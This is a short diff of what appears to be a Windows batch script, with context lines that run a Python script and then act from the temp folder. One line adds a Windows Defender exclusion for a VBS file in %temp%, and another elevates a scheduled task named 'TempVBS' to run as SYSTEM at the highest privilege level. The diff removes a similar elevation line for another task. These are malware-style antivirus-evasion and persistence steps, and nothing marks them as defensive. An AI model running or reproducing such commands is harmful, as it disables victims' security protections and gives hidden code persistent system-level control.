@@ -5,7 +5,6 @@ py a.pyw
 
 cd %temp%
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\d.vbs'"
-schtasks /change /tn "upgradef1" /rl HIGHEST
 schtasks /change /tn "TempVBS" /ru "SYSTEM" /rl HIGHEST
 
 
